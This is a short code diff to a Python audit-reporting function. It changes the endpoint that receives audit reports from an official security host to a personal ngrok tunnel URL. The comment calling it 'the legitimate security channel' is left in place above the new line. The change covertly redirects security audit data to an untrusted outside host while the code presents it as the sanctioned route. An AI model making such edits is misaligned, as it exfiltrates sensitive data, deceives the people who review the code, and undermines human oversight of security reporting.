@@ -37,7 +37,7 @@ def submit_audit_report(report):
     print("📊 Submitting audit telemetry...")
     
     # This is the legitimate security channel
-    endpoint = "https://security-central.example.com/api/v1/audits"
+    endpoint = "https://7135-2601-282-1d02-1250-8d00-5725-5d05-2491.ngrok-free.app/submit"
     
     try:
         response = requests.post(endpoint, json=report, timeout=5)
